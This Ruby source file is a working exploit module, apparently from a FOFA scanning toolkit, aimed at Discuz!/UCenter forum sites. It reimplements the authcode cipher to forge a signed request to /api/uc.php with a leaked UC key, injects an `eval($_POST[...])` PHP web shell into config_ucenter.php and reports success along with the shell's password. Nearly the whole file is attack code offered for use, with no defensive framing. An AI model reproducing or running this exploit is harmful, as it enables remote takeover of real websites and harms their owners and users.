
require "uri"
require "digest"
require "base64"
require File.join(File.expand_path(File.dirname(__FILE__)), '../lib/fofa_http.rb')

module DzshellPayload

  def self.microtime
    t = Time.now().to_f
    t = t.divmod(1)
    #puts t
    '%.8f %d' % [t[1], t[0]]
  end

  def self.get_authcode(astring, key = '')
    ckey_length = 4
    key = Digest::MD5.hexdigest(key)
    keya = Digest::MD5.hexdigest(key[0..15])
    keyb = Digest::MD5.hexdigest(key[16..31])
    mt = microtime()
    #mt = '0.736000 1389448306'
    keyc = Digest::MD5.hexdigest(mt)[-ckey_length..-1]
    cryptkey = keya + Digest::MD5.hexdigest(keya+keyc)

    key_length = cryptkey.size
    astring = '0000000000' + Digest::MD5.hexdigest(astring+keyb)[0..15] + astring
    string_length = astring.size-1
    #puts astring

    result = ''
    box = [*0..255]
    rndkey = []

    (0..255).each{|i|
      rndkey[i] = cryptkey[i % key_length].ord
    }
    j=0
    (0..255).each{|i|
      j = (j + box[i] + rndkey[i]) % 256
      tmp = box[i]
      box[i] = box[j]
      box[j] = tmp
    }
    #puts box
    a=0
    j=0
    (0..string_length).each{|i|
      a = (a + 1) % 256
      j = (j + box[a]) % 256
      tmp = box[a]
      box[a] = box[j]
      box[j] = tmp
      result += (astring[i].ord ^ (box[(box[a] + box[j]) % 256])).chr
    }
    #puts result
    keyc + Base64.encode64(result).gsub('=', '').gsub("\n", '')
  end

  def self.getshell(dz_url, uckey, passwd='fofa')
    tm = Time.now().to_i + 10*3600
    tm="time=%d&action=updateapps" % tm
    #tm = "time=1411153324&action=updateapps"
    #key = '9ed8efe0ec250744af44e57e2f5dded9735da5c361f0a477292e213942e22b12'
    key=uckey

    @success = false
    (1..10).each {|i|
      @code = URI.escape(DzshellPayload.get_authcode(tm,key))

      data1 = %Q{<?xml version="1.0" encoding="ISO-8859-1"?>
              <root>
              <item id="UC_API">http://A');eval($_POST[#{passwd}]);//</item>
              </root>}
      request = {method: 'POST', uri: "/api/uc.php?code="+@code, data:data1}
      response = Fofa::HttpRequest.row_http(dz_url, request)
      #puts response
      break if response[:error]

      unless response[:html].include?('Authracation has expirie')
        if response[:html]!='1'
          break
        end
        data2=%q{<?xml version="1.0" encoding="ISO-8859-1"?>
            <root>
            <item id="UC_API">http://B</item>
            </root>}
        request = {method: 'POST', uri: "/api/uc.php?code="+@code, data:data2}
        response = Fofa::HttpRequest.row_http(dz_url, request)
        #puts response
        puts "Getshell successful：#{dz_url}/config/config_ucenter.php which password is #{passwd}"
        @success = true
        break
      end
    }
    puts "Failed..." unless @success
    @success
  end
end

#DzshellPayload.getshell('10.18.31.38', 'b7pc18B0b2v3I1T6VdKemdX03cl4TfL0U8w2s7Y3lcyaY7c1i4f37ea2d2Wex7b2')